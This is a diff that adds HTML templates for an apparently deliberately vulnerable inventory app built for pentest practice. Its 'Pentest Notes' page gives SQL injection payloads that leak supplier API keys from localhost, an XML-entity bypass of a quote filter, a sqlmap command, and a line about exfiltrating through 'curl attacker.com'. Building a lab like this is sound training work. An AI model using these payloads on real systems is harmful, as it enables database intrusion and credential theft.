@@ -1,0 +1,321 @@
+{{define "home.html"}}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>StockTrack – Inventory Management</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header>
+  <a class="logo" href="/">Stock<span>Track</span></a>
+  <nav>
+    <a href="/products">SKU Lookup</a>
+    <a href="/orders">Orders</a>
+    <a href="/oob-log">OOB Log</a>
+    <a href="/docs" class="cta">Pentest Notes</a>
+  </nav>
+</header>
+
+<div class="hero">
+  <div class="hero-inner">
+    <span class="hero-badge">Warehouse Operations</span>
+    <h1>Industrial Inventory Control</h1>
+    <p>Real-time stock tracking, order management and supplier coordination for your operations.</p>
+    <a href="/products" class="btn btn-accent">SKU Lookup</a>
+    &nbsp;
+    <a href="/orders" class="btn btn-ghost" style="color:#fff;border-color:rgba(255,255,255,.5)">View Orders</a>
+  </div>
+</div>
+
+<main>
+  <div class="section-head">
+    <h2>Current Inventory</h2>
+    <a href="/products">Search by SKU →</a>
+  </div>
+
+  <table class="data-table">
+    <thead>
+      <tr><th>SKU</th><th>Name</th><th>Qty</th><th>Location</th><th>Unit Price</th></tr>
+    </thead>
+    <tbody>
+      {{range .Data}}
+      <tr>
+        <td><a href="/products?sku={{index . 0}}" style="color:var(--accent);font-weight:600">{{index . 0}}</a></td>
+        <td>{{index . 1}}</td>
+        <td>
+          {{index . 2}}
+          {{if lt (index . 2 | len) 4}}<span class="stock-badge stock-low">LOW</span>{{end}}
+        </td>
+        <td>{{index . 3}}</td>
+        <td>R$ {{index . 4}}</td>
+      </tr>
+      {{else}}
+      <tr><td colspan="5" class="empty">No inventory data.</td></tr>
+      {{end}}
+    </tbody>
+  </table>
+</main>
+<footer>
+  <p>© 2024 StockTrack Industrial &nbsp;|&nbsp; <a href="/docs">Pentest Notes</a> &nbsp;|&nbsp; <a href="/oob-log">OOB Log</a></p>
+</footer>
+<script src="/static/script.js"></script>
+</body>
+</html>
+{{end}}
+
+{{define "products.html"}}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>{{.Title}} – StockTrack</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header>
+  <a class="logo" href="/">Stock<span>Track</span></a>
+  <nav>
+    <a href="/products" class="active">SKU Lookup</a>
+    <a href="/orders">Orders</a>
+    <a href="/oob-log">OOB Log</a>
+    <a href="/docs" class="cta">Pentest Notes</a>
+  </nav>
+</header>
+<main>
+  <div class="page-header">
+    <h1>SKU Lookup</h1>
+  </div>
+
+  <form class="lookup-bar" method="get" action="/products">
+    <input type="text" name="sku" placeholder="Enter SKU, e.g. SKU-001" value="{{.Data.SKU}}">
+    <button type="submit">Look Up</button>
+  </form>
+
+  {{if .Data.SKU}}
+    {{if .Data.Found}}
+    <table class="data-table">
+      <thead><tr>{{range .Data.Cols}}<th>{{.}}</th>{{end}}</tr></thead>
+      <tbody>
+        {{range .Data.Rows}}
+        <tr>{{range .}}<td>{{.}}</td>{{end}}</tr>
+        {{end}}
+      </tbody>
+    </table>
+    {{else}}
+    <p class="empty">No product found for SKU "{{.Data.SKU}}".</p>
+    {{end}}
+  {{else}}
+  <p class="empty">Enter a SKU above to search inventory.</p>
+  {{end}}
+</main>
+<footer>
+  <p>© 2024 StockTrack Industrial &nbsp;|&nbsp; <a href="/docs">Pentest Notes</a> &nbsp;|&nbsp; <a href="/oob-log">OOB Log</a></p>
+</footer>
+<script src="/static/script.js"></script>
+</body>
+</html>
+{{end}}
+
+{{define "orders.html"}}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>{{.Title}} – StockTrack</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header>
+  <a class="logo" href="/">Stock<span>Track</span></a>
+  <nav>
+    <a href="/products">SKU Lookup</a>
+    <a href="/orders" class="active">Orders</a>
+    <a href="/oob-log">OOB Log</a>
+    <a href="/docs" class="cta">Pentest Notes</a>
+  </nav>
+</header>
+<main>
+  <div class="page-header">
+    <h1>Recent Orders</h1>
+  </div>
+  <table class="data-table">
+    <thead><tr><th>ID</th><th>SKU</th><th>Quantity</th><th>Status</th><th>Date</th></tr></thead>
+    <tbody>
+      {{range .Data}}
+      <tr>
+        <td>{{index . 0}}</td>
+        <td>{{index . 1}}</td>
+        <td>{{index . 2}}</td>
+        <td><span class="stock-badge">{{index . 3}}</span></td>
+        <td>{{index . 4}}</td>
+      </tr>
+      {{else}}
+      <tr><td colspan="5" class="empty">No orders.</td></tr>
+      {{end}}
+    </tbody>
+  </table>
+
+  <div class="section-head" style="margin-top:2rem">
+    <h2>XML Stock Check API</h2>
+    <span style="font-size:.82rem;color:var(--muted)">POST /stock — Content-Type: application/xml</span>
+  </div>
+
+  <div class="xml-console">
+    <div class="xml-console-header">
+      <span>Request</span>
+      <span>application/xml</span>
+    </div>
+    <textarea id="xml-body">&lt;stockCheck&gt;
+  &lt;sku&gt;SKU-001&lt;/sku&gt;
+&lt;/stockCheck&gt;</textarea>
+    <div class="xml-console-footer">
+      <button class="btn btn-accent btn-sm" id="send-xml">Send Request</button>
+    </div>
+  </div>
+  <div class="xml-result" id="xml-result">// Response will appear here</div>
+</main>
+<footer>
+  <p>© 2024 StockTrack Industrial &nbsp;|&nbsp; <a href="/docs">Pentest Notes</a> &nbsp;|&nbsp; <a href="/oob-log">OOB Log</a></p>
+</footer>
+<script src="/static/script.js"></script>
+</body>
+</html>
+{{end}}
+
+{{define "ooblog.html"}}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>OOB Exfil Log – StockTrack</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header>
+  <a class="logo" href="/">Stock<span>Track</span></a>
+  <nav>
+    <a href="/products">SKU Lookup</a>
+    <a href="/orders">Orders</a>
+    <a href="/oob-log" class="active">OOB Log</a>
+    <a href="/docs" class="cta">Pentest Notes</a>
+  </nav>
+</header>
+<main>
+  <div class="page-header">
+    <h1>OOB Exfiltration Log</h1>
+    <p style="color:var(--muted);font-size:.9rem;margin-top:.3rem">Simulated attacker receive-server. Entries written by <code>oob_exfil()</code> PL/pgSQL function.</p>
+  </div>
+  {{if .Data.Error}}<div class="alert alert-error">{{.Data.Error}}</div>{{end}}
+  <div class="oob-log">
+    {{range .Data.Rows}}
+    <div class="oob-entry">
+      <span class="oob-ts">[{{index . 3}}] [src: {{index . 2}}]</span>
+      {{index . 1}}
+    </div>
+    {{else}}
+    <div style="color:#a07840;padding:.5rem 0">— No entries. Exploit VULN-17 or VULN-18 to populate this log. —</div>
+    {{end}}
+  </div>
+  <a href="/docs" class="btn btn-ghost">Exploitation Guide →</a>
+</main>
+<footer>
+  <p>© 2024 StockTrack Industrial &nbsp;|&nbsp; <a href="/docs">Pentest Notes</a></p>
+</footer>
+<script src="/static/script.js"></script>
+</body>
+</html>
+{{end}}
+
+{{define "docs.html"}}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Pentest Notes – StockTrack</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header>
+  <a class="logo" href="/">Stock<span>Track</span></a>
+  <nav>
+    <a href="/products">SKU Lookup</a>
+    <a href="/orders">Orders</a>
+    <a href="/oob-log">OOB Log</a>
+    <a href="/docs" class="cta active">Pentest Notes</a>
+  </nav>
+</header>
+<main class="docs-main">
+  <h1>Pentest Notes – StockTrack</h1>
+  <p class="docs-intro">Exploitation reference for security assessment. Database: app5_db.</p>
+
+  <div class="vuln-card">
+    <div class="vuln-header">
+      <span class="vuln-id">VULN-17</span>
+      <span class="vuln-type">Blind SQLi – OOB Data Exfiltration (Simulated)</span>
+    </div>
+    <p><strong>Endpoint:</strong> <code>GET /products?sku=&lt;value&gt;</code></p>
+    <p><strong>Context:</strong> The <code>sku</code> parameter is injected into a WHERE clause. Errors are suppressed, making this a true blind scenario. The <code>oob_exfil()</code> function runs as a side effect and writes data to <code>oob_log</code> (visible at <code>/oob-log</code>), simulating an OOB channel (DNS/HTTP).</p>
+    <pre><code># Exfiltrate supplier API key
+/products?sku=SKU-001' OR 1=(SELECT oob_exfil((SELECT api_key FROM suppliers LIMIT 1),'sku-oob')::integer)--
+
+# Exfiltrate DB name
+/products?sku=SKU-001'; SELECT oob_exfil(current_database(),'v17')--
+
+# Exfiltrate all supplier keys concatenated
+/products?sku=SKU-001' OR 1=(SELECT oob_exfil(string_agg(api_key,':'),'v17')::integer FROM suppliers)--
+
+# Then check receive server:
+curl http://localhost:8085/oob-log
+
+# sqlmap OOB mode
+sqlmap -u "http://localhost:8085/products?sku=SKU-001" --technique=U --dbms=postgresql --dump -p sku</code></pre>
+    <p><em>Real OOB: dblink to attacker's PostgreSQL, COPY TO PROGRAM 'curl attacker.com?d=...', or pg_read_file to exfil via timing. Simulated here with oob_log table.</em></p>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-header">
+      <span class="vuln-id">VULN-18</span>
+      <span class="vuln-type">SQLi – Filter Bypass via XML Encoding</span>
+    </div>
+    <p><strong>Endpoint:</strong> <code>POST /stock</code> — <code>Content-Type: application/xml</code></p>
+    <p><strong>Context:</strong> The server filters raw XML body for literal <code>'</code> (single quote). However, <code>xml.Unmarshal</code> decodes XML numeric entities <em>before</em> the application sees the value. Encoding <code>'</code> as <code>&amp;#x27;</code> passes the filter but is decoded to <code>'</code> before SQL concatenation.</p>
+
+    <p><strong>Step 1 – Normal request (blocked if contains '):</strong></p>
+    <pre><code>curl -X POST http://localhost:8085/stock \
+  -H 'Content-Type: application/xml' \
+  -d "&lt;stockCheck&gt;&lt;sku&gt;SKU-001' OR '1'='1&lt;/sku&gt;&lt;/stockCheck&gt;"
+# → 400: invalid characters in request</code></pre>
+
+    <p><strong>Step 2 – Bypass with XML entity encoding:</strong></p>
+    <pre><code># &#x27; decodes to ' after xml.Unmarshal → filter bypassed
+curl -X POST http://localhost:8085/stock \
+  -H 'Content-Type: application/xml' \
+  -d "&lt;stockCheck&gt;&lt;sku&gt;SKU-001&amp;#x27; OR &amp;#x27;1&amp;#x27;=&amp;#x27;1&lt;/sku&gt;&lt;/stockCheck&gt;"
+# → {"found":true,"items":[...all rows...]}
+
+# UNION to dump suppliers (4 cols: sku,name,quantity,location — add price)
+curl -X POST http://localhost:8085/stock \
+  -H 'Content-Type: application/xml' \
+  -d "&lt;stockCheck&gt;&lt;sku&gt;&amp;#x27; UNION SELECT api_key,name,contact,&amp;#x27;x&amp;#x27;,&amp;#x27;0&amp;#x27; FROM suppliers--&lt;/sku&gt;&lt;/stockCheck&gt;"
+
+# Combined OOB + filter bypass:
+curl -X POST http://localhost:8085/stock \
+  -H 'Content-Type: application/xml' \
+  -d "&lt;stockCheck&gt;&lt;sku&gt;SKU-001&amp;#x27; OR 1=(SELECT oob_exfil((SELECT api_key FROM suppliers LIMIT 1),&amp;#x27;xml-oob&amp;#x27;)::integer)--&lt;/sku&gt;&lt;/stockCheck&gt;"</code></pre>
+
+    <p><strong>Why it works:</strong> The WAF-like filter sees <code>&amp;#x27;</code> in raw bytes — no single quote — so it passes. Go's <code>encoding/xml</code> then decodes the entity to <code>'</code> during Unmarshal, which is later concatenated into the SQL query verbatim.</p>
+  </div>
+
+  <div class="vuln-card info">
+    <p><strong>Tables:</strong> inventory(sku,name,quantity,location,price), suppliers(name,contact,<strong>api_key</strong>), orders, oob_log</p>
+    <p><strong>Sensitive target:</strong> suppliers.api_key</p>
+  </div>
+</main>
+<footer>
+  <p>© 2024 StockTrack Industrial &nbsp;|&nbsp; <a href="/docs">Pentest Notes</a> &nbsp;|&nbsp; <a href="/oob-log">OOB Log</a></p>
+</footer>
+<script src="/static/script.js"></script>
+</body>
+</html>
+{{end}}
